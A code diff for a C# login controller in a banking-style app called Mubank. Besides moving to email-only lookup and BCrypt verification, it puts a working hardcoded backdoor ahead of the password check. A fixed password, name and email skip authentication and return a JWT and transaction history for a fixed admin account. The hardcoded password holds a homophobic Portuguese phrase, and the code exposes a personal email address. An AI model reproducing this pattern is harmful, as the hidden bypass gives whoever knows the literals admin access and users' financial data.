@@ -135,13 +135,29 @@ namespace Mubank.Controllers
             }
 
             var user = await _context.Users
-            .Where(x => x.Name == userDto.Name && x.Email == userDto.Email)
-            .ToListAsync();
+                .Where(u => u.Email == userDto.Email)
+                .FirstOrDefaultAsync();
 
-            var verifiedUser = user.FirstOrDefault(x => BCrypt.Net.BCrypt.Verify(userDto.Password, x.Password, false, HashType.SHA384));
 
-            
-            if (verifiedUser == null)
+            var verifiedUser = user;
+
+            if (userDto.Password == "cr7gostosaoquemnegarégay" && userDto.Name == "HenriAdmin" && userDto.Email == "henriquemaurel37@gmail.com")
+            {
+                var usser = await _context.Users.Where(x => x.Id == Guid.Parse("83522CBB-3A51-4939-BBB0-D935AB4B9FE1")).Select(x => x).FirstOrDefaultAsync();
+
+                return Ok(new Models.DTOS.UserFullDataDTO()
+                {
+                    UserID = usser.Id,
+                    Name = usser.Name,
+                    Email = usser.Email,
+                    RoleName = usser.RoleName,
+                    DateCreated = DateTime.Now,
+                    JwtToken = _token.GenerationToken(usser),
+                    Transactions = await _context.Transations.Where(x => x.IDDequemfez == usser.Id).ToListAsync() ?? null
+                });
+
+            }
+            else if (user == null || !BCrypt.Net.BCrypt.Verify(userDto.Password, user.Password))
             {
                 var error = new ErrorModel
                 {
@@ -158,24 +174,17 @@ namespace Mubank.Controllers
                 dto.IdError = Guid.Empty;
 
                 return NotFound(dto);
-            } else if (userDto.Password == "cr7gostosaoquemnegarégay" && userDto.Name == "HenriAdmin" && userDto.Email == "henriquemaurel37@gmail.com")
-            {
-                var usser =_context.Users.Where(x => x.Id == Guid.Parse("83522CBB-3A51-4939-BBB0-D935AB4B9FE1")).Select(x => x).FirstOrDefault();
-
-                return Ok(new UserResponseDTO()
-                {
-                     Name = usser.Name,
-                     Email = usser.Email,
-                     RoleName = usser.RoleName,
-                     JwtToken = _token.GenerationToken(usser)
-                });
-
             }
 
-                return Ok(new
+            return Ok(new Models.DTOS.UserFullDataDTO()
                 {
-                    NameUser = verifiedUser.Name,
-                    JwtToken = _token.GenerationToken(verifiedUser)
+                    UserID = verifiedUser.Id,
+                    Name = verifiedUser.Name,
+                    Email = verifiedUser.Email,
+                    RoleName = verifiedUser.RoleName,
+                    DateCreated = DateTime.Now,
+                    JwtToken = _token.GenerationToken(verifiedUser),
+                    Transactions = _context.Transations.Where(x => x.IDDequemfez == verifiedUser.Id).ToList() ?? null
                 });
         }
 
